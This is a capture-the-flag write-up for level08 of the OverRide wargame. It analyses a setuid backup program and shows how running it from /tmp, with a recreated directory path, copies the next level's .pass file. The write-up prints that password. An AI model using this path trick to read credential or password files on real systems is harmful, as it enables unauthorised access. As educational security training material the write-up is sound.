# level08

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level08/level08
```

The program takes one argument: a file name. It opens `./backups/.log` and the file pointed by the only argument. It
copies char by char the content of the argument into a new file in `./backups/` and close everything.

## Exploit

The exploit is quite straightforward: first go to the only folder we have rights to write, `/tmp/`.

```console
level08@OverRide:~$ cd /tmp
```

Then we are going to re-create a path for our file:

```console
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
```

Ok, now we are calling `level08` program with the `level09`'s `.pass` file:

```console
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
```

And our `.pass` is copied!

```console
level08@OverRide:/tmp/backups$ cat home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

✌️
